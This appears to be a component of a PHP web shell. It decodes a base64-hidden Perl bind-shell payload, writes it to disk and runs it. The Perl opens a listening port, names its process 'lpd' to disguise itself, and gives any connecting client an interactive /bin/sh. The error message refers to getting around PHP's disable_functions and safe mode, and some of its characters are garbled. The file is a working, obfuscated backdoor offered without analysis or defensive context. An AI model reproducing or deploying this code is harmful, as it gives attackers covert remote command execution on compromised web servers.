<?php
$lbp="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7JHBvcnQ9JEFSR1ZbMF07JHByb3RvPWdldHByb3Rv
YnluYW1lKCd0Y3AnKTskY21kPSJscGQiOyQwPSRjbWQ7c29ja2V0KFNFUlZFUiwgUEZfSU5FVCwg
U09DS19TVFJFQU0sICRwcm90byk7c2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JF
VVNFQUREUiwgcGFjaygibCIsIDEpKTtiaW5kKFNFUlZFUiwgc29ja2FkZHJfaW4oJHBvcnQsIElO
QUREUl9BTlkpKTtsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pO2Zvcig7ICRwYWRkciA9IGFjY2Vw
dChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCl7b3BlbihTVERJTiwgIj4mQ0xJRU5UIik7
b3BlbihTVERPVVQsICI+JkNMSUVOVCIpO29wZW4oU1RERVJSLCAiPiZDTElFTlQiKTtzeXN0ZW0o
Jy9iaW4vc2gnKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpO30g";
$oplb=fopen("lbp.pl","w");
fwrite($oplb,base64_decode($lbp));
fclose($oplb);
system("perl lbp.pl $wb") or die("I Can Not Execute Command For ����shell Disable_functions Or Safe Mode");

?>